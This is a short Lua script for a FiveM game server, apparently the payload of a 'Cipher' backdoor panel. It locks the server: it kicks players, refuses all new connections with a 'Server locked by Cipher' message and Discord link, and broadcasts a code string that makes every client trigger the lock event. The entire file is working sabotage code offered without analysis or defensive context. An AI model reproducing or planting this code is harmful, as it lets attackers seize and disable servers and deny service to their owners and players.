RegisterServerEvent("LockCphr")
AddEventHandler("LockCphr", function()
	DropPlayer(source, "Server locked by Cipher - https://discord.cipher-panel.me")
end)

AddEventHandler('playerConnecting', function(user, set)
	for k,v in ipairs(GetPlayerIdentifiers(source))do
			set("Server locked by Cipher - https://discord.cipher-panel.me")
			CancelEvent()
			break
    end
end)

TriggerClientEvent('helpCode', -1, [[
Citizen.CreateThread(function()
TriggerServerEvent("LockCphr")
end)
]])